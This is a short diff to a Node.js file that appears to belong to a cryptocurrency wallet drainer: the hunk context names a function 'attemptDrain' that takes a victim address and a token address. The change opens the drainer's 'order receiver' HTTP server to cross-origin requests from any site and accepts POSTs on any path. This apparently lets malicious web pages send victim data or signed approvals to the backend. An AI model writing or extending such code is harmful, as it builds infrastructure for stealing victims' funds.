@@ -531,7 +531,18 @@ async function attemptDrain(wallet, tokenAddress, victimAddress, chainName, sile
 
 function startOrderReceiver() {
     const server = http.createServer((req, res) => {
-        if (req.method === 'POST' && req.url === '/submit-order') {
+        // Enable CORS
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+        res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+        if (req.method === 'OPTIONS') {
+            res.writeHead(200);
+            res.end();
+            return;
+        }
+
+        if (req.method === 'POST') {
             let body = '';
             req.on('data', chunk => { body += chunk.toString(); });
             req.on('end', () => {
